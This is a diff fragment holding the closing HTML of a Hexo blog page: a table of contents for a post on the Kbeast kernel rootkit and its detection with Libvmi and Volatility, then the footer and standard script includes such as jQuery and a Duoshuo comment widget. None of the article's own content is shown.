+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0X00-全文环境"><span class="nav-number">1.</span> <span class="nav-text">0X00 全文环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0X01-Kbeast-特性"><span class="nav-number">2.</span> <span class="nav-text">0X01 Kbeast 特性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0X02-系统调用劫持基础"><span class="nav-number">3.</span> <span class="nav-text">0X02 系统调用劫持基础</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0X03-Kbeast-使用"><span class="nav-number">4.</span> <span class="nav-text">0X03 Kbeast 使用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0X04-Kbeast-核心"><span class="nav-number">5.</span> <span class="nav-text">0X04 Kbeast 核心</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0X05-Kbeast-Detection-Using-Libvmi-and-Volatility"><span class="nav-number">6.</span> <span class="nav-text">0X05 Kbeast Detection Using Libvmi and Volatility</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reference"><span class="nav-number">7.</span> <span class="nav-text">Reference</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2015 - 
+  <span itemprop="copyrightYear">2016</span>
+  <!--chonghua 注释--> 
+ <!--span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span-->
+  <span class="author" itemprop="copyrightHolder">Diting0x</span>
+</div>
+
+
+<!--chonghua注释掉了-->
+
+<!--div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
+</div-->
+
+<!--div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div-->
+
+        
+
+        
+      </div>
+    </footer>
+
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/blog/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/blog/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/blog/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/blog/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/blog/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/blog/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/blog/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/blog/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/blog/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/blog/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/blog/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"chongh"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+  
+
+
+
+
+
+  
+  
+  
+
+  
+
+  
+
+</body>
+</html>
